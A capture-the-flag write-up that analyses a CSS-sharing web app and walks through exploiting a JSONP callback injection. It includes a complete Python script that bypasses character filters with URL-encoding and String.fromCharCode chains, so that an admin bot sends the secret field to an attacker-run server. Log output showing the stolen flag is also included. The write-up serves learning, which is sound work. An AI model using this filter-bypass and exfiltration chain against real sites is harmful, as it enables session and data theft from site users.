# i

[library.m0unt41n.ch/challenges/i](https://library.m0unt41n.ch/challenges/i) ![](../../resources/web.svg) ![](../../resources/medium.svg) 

# TL;DR

Online vault, for sharing "CSS".

# Analysis

## Registration, login and dashboard

*   We can `/register` and `/login`
*   Once logged in, we get a `/dashboard` where we can keep keep a piece of CSS,
    update it (`/update_style`) etc.
*   User's `style` is stored in `users` table, together with `username`/`password`
*   The dashboard is dynamic, `dashboard.js`, additionally handles "share" action
    (see below)
*   `dashboard.js` adds a `<script>` element to DOM HEAD, representing user's CSS.
    The script source is remote, either just: `/get_style` or, if `callback` URL
    param is set, `/get_style?callback=<callback>`. The script looks roughly:
    
    ```javascript
    updateStyle(`body{
      background-color: white;
    }`)
    ```
    Which, in turn, calls a JS function defined in `dashboard.js`, which
    adds a `<style>` element and fills it with that content. Complicated!

## Viewing shared styles (/share)

In the dashboard, we can create a persistent copy of our CSS, and get a link to
a `/share` endpoint, which displays UI with CSS contents.

*   `/share` internally sends a request to `/generate_link`, to persist current style
    in a separate `styles` table and generate a random ID. It returns a markdown-like
    text, that includes HTML link.
*   `/share` uses `safeview.html` template. The textarea in the template is empty and
    filled from `safeview.js`.
    *   The script fetches the JS with CSS with `/get_style?share_id=XXXX`. That
        calls `updateStyle()`, also defined in `safeview.js`, which sets
        the content of `customstyle` textarea.
    *   If `callback` urlparam is set, it is sanitized (
        (remove `\`, `+`, `<`, `>`, `'`, `"`, `%`, `script`, `iframe`)
    *   And the above call becomes `/get_style?share_id=XXX&callback=YYY`.
*   One still needs to be logged in to access all that.
*   If logged as admin, the share page will contain the flag in the text input `flag`,
    (otherwise, `****`).

## Internal: fetch JS with style (/get_style)

It takes `share_id`, gets the style from share DB and removes: `'`, `"`, `` ` ``, `+`
(if there is no `share_id`, it loads current user's style instead - used in
daashboard view, as described above).

**Important**: it does not return CSS as such, but rather piece of JS:
```javascript
updateStyle(`body{
    background-color: white;
}`)
```
The `updateStyle` (function name) can be overwritten with `callback` param. So,
`/get_style?share_id=XXX&callback=windows.location.replace` will redirect the
browser page to the URL saved as `style`!

That `callback` can be passed from the `safeview.js` above, as part of displaying
a `/share`.

## Sharing with admin (/bot)

We can also _"Share CSS with admin"_. This opens a separate dialog, where we can
enter arbitrary text. That gets sent to `/bot` endpoint and there:

*   The text is passed as `url` param
    *   It has to start with `/share?`
    *   It can not contain: `&&`, `;`, `|`, `(`, `)`
    *   If both are true, server starts `node bot.js <url>`.
*   There is a dummy `/gift_free_hat` endpoint

## bot.js

A node.js program, with a simple Puppeteer interaction:

*   Starts a browser
*   Goes to `/login` page, logs in as admin (loads locally stored `password.txt`)
*   Goes to `/dashboard`
*   Goes to `http://127.0.0.1:5000/` + the `url` param passed above.

It has unused `const url = require('url');` but, there is no simple way to 
escape from bot, it just goes to these pages, passing args as needed.

## Other

*   The password is stored in `password.txt`. The flag is in `flag.txt`
*   Passwords are stored as sha256 hexdigest
*   The session is a JWT cookie with `app.config['SECRET_KEY] = secrets.token_hex(20)`
*   SQL injection is unlikely, all queries use `?` correctly. 


# Summary

*   We can get the admin to go to arbitrary `/share?...` by calling `/bot`
*   That can include a `callback` parameter, which is almost like JS injection,
    except that it is heavily guarded with escape functions.

So, overall plan of attack would be to:

*   Create user, log in
*   Generate a share with `/generate_link`. The text we put will be stored in
    the DB verbatim, but it will be escaped by `/get_style` / `/share`.
*   Save the share ID from the response
*   Call the bot with `/share?share_id=share_id&callback=<something smart>`
*   Inject enough JS from either "style" or "callback", that the bot page
    executes, approximately:
    
    ```javascript
    window.location.replace(MY_SERVER+"/"+document.getElementById("flag").value)`.
    ```
    Then, get the password from remote server logs.


# Crafting the explot

Turns out, we can ignore the "style" part and focus the exploit on `callback`.
We need to beat following protections:

## /bot handler protection:

```javascript
if "&&" in url or ";" in url or "|" in url or "(" in url or "{" in url:
    return "No free hats for you >:("
```

Let's urlencode these

```python
def botProof(s):
    return s.replace("&&", "%26%26").replace(";", "%3B").replace("|", "%7C").replace("(", "%28").replace("}", "%7B")
```

## safeview.js protection

```javascript
function escape(data) {
    var nopes = ["`", "+", "<", ">", "'", '"', "%"]
    var x = data
    nopes.forEach(noperino => {
        x = x.replaceAll(noperino, '');
    });
    x = x.replaceAll(/script/ig, '');
    x = x.replaceAll(/iframe/ig, '');
    return x
}
```

The main thing this will prefent is creating strings (remote server, flag).
There are many ways around it, one that I found is using
`String.fromCharCode()` in Javascript plus `concat()`. Helper function:

```python
def escapeProof(s):
    res = "String.fromCharCode("+str(ord(s[0]))+")"
    for c in s[1:]:
        res+=".concat(String.fromCharCode("+str(ord(c))+"))"
    return res
```

Test:

```python
>>> escapeProof("http")
'String.fromCharCode(104).concat(String.fromCharCode(116)).concat(String.fromCharCode(116)).concat(String.fromCharCode(112))'
```

No forbidden characters there &#128578;

Note that technically speaking the `escape()` blacklist contains `%`. But, by the time
we get here, that string would be URLdecoded already. Also note that we have to use
`escapeProof()` first as needed (create strings) and then, wrap everything in
`bootProof()`.

## /get_style handler protection

Technically speaking, there is also

```python
    stopthisshitnorelect = ["'", '"', "`", "+"]
    for x in stopthisshitnorelect:
        style = style.replace(x, "")
```

... but we don't have to worry about this one, as we won't be using style for the exploit.
It's a subset of the `safeview.js` protection anyway.
    
# Running locally

## Start Docker container

```bash
$ docker build -t i .
$ docker run -p 5000:5000 -ti i:latest
```

## Start a local HTTP server

```bash
$ python3 -m http.server 8080
```

## Build the exploit

```python
import requests
import re

def botProof(s):
    return s.replace("&&", "%26%26").replace(";", "%3B").replace("|", "%7C").replace("(", "%28").replace("}", "%7B")

def escapeProof(s):
    res = "String.fromCharCode("+str(ord(s[0]))+")"
    for c in s[1:]:
        res+=".concat(String.fromCharCode("+str(ord(c))+"))"
    return res

URL="http://localhost:5000"
CAPTURE_URL="http://LOCAL_MACHINE_IP:8080/BLA/"

LOGIN={'username': 'user', 'password':'password'}
session = requests.session()

STYLE="{ color: red; }"  # Dummy style
CALLBACK=botProof('window.location.replace('+
                  escapeProof(CAPTURE_URL)+
                  '.concat(document.getElementById('+
                  escapeProof("flag")+
                  ').value));updateStyle')

# Initialize user
session.post(URL+"/register", data=LOGIN)
session.post(URL+"/login", data=LOGIN)
# Generate a share, get the ID
resp = session.post(URL+"/generate_link", json={'style': STYLE})
share_id = re.search('share_id=([0-9a-f]+)', resp.text).group(1)
# Trigger the bot
session.post(URL+"/bot", data={'url': '/share?share_id='+share_id+"&callback="+CALLBACK})
```

And this works!

```
192.168.254.2 - - [29/Sep/2024 18:53:04] "GET /BLA/fake_flag HTTP/1.1" 404 -
```

# Getting the remote flag

First, we need a public Web server. AWS instance will do just fine.
Then, we run the server there, replace `URL` and `CAPTURE_URL` and
just watch the logs:

```
# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
(...)
128.140.62.133 - - [29/Sep/2024 15:56:19] "GET /BLA/l3ak1ngsecrets HTTP/1.1" 404 -
```

---

## `shc2023{l3ak1ngsecrets}`


<hr>

&copy; [muflon77](https://library.m0unt41n.ch/players/805ae1c8-9fe4-5816-b4a4-5057fa6eedb1)
